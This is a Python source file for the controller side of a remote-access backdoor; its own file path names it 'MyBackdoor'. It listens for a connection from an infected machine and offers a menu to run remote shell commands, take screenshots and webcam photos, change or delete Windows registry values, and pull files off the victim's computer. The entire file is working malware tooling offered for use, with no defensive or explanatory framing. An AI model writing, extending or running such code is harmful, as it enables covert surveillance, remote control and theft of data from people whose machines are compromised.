import socket,os,sys
from io import StringIO, BytesIO
from random import randint

ipArgv = sys.argv[1]
portArgv = sys.argv[2]
intPortArgv = int(portArgv)

ip = ipArgv
port = intPortArgv

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((ip,port))

s.listen(1)

localPath = os.getcwd()

def connection(byte):
    conn.send(str(byte).encode())
    
conn, addr = s.accept()
host, port2 = addr

print(f"\n Connection was succesfully :: ip = {host} :: port = {port2}")

while True:

    first = str(input("""
    1-Shell command
    2-Screenshot
    3-Photo from camera
    4-Chat message
    5-Add regedit file
    6-Delete regedit value
    7-Send file
    8-Get file
    
> """))

    if first == "1":
        while True:
            directory = str(input("Which Directory: "))
            if directory == "exit":
                break
            else:
                connection(1)
                conn.send(directory.encode())
                command = input("Command: ")
                conn.send(command.encode())
                message = conn.recv(1024*1024)
                try:
                    print(message.decode('cp857'))
                except UnicodeDecodeError:
                    print(message)

    elif first == "2":

        try:
            os.mkdir("Screenshots")
            os.mkdir("Camera")
        except FileExistsError:
            pass
        connection(2)
        imageByte = conn.recv(4096*4096)
        randomNumber = randint(0,100000)
        strRandomNumber = str(randomNumber)
        
        with open(strRandomNumber+".png","wb") as image:
            image.write(imageByte)
        os.replace(localPath+"\\"+strRandomNumber+".png",localPath+"\\Screenshots\\{}"
        .format(strRandomNumber+".png"))
        image.close()

    elif first == "3":
        connection(3)
        fileByte = conn.recv(4096*4096)
        if fileByte == b"camera is not used:.":
            print("\nCamera is not used:.")
        else:
            randomCamera = randint(0,100000)
            strRandomCamera = str(randomCamera)
            with open(strRandomCamera+".png","wb") as cameraImageFile:
                cameraImageFile.write(fileByte)
            cameraImageFile.close()

            os.replace(localPath+"\\"+strRandomCamera+".png","C:\\Users\\berat\\Desktop\\desktop\\Backdoor\\MyBackdoor\\Camera\\{}"
            .format(strRandomCamera+".png"))
        
    elif first == "4":
        connection(4)
        message = str(input("Message: "))
        conn.send(message.encode())
    elif first == "5":
        connection(5)
        willPrint = conn.recv(1024*1024)
        print(b"\nRegedit Change: " + willPrint)

    elif first == "6":
        connection(6)
        willDeleteMessage = conn.recv(1024*1024)
        print(b"\nRegedit Change: "+willDeleteMessage)
        
    elif first == "7":
        connection(7)

        sendFile = str(input("Enter the name of the file: "))

        extension = sendFile.split(".")[1]
        conn.send(extension.encode()) #[0][1]
            
        with open(sendFile, 'rb') as binaryFiles:
            binaryFile = binaryFiles.read()
        binaryFiles.close()

        conn.send(binaryFile) #[1][1]
    elif first == "8":
        connection(8)
        getFile = str(input("Enter get file path: "))
        getFileExtension = getFile.split(".")[1]
        byteGetFile = getFile.encode()
        conn.send(byteGetFile)

        byteGetFile = conn.recv(4096*4096)
        randomName = randint(0,10000)
        stringRandomName = str(randomName)
        fileName = stringRandomName+"."+getFileExtension
        try:
            os.mkdir("GetFiles")
        except FileExistsError:
            pass
        with open(fileName,"wb") as writeGetFile:
            writeGetFile.write(byteGetFile)
        writeGetFile.close()
        
        getFilePath = os.getcwd()
        os.replace(getFilePath+"\\"+stringRandomName+"."+getFileExtension,getFilePath+
                                        "\\GetFiles\\"+stringRandomName+"."+getFileExtension)
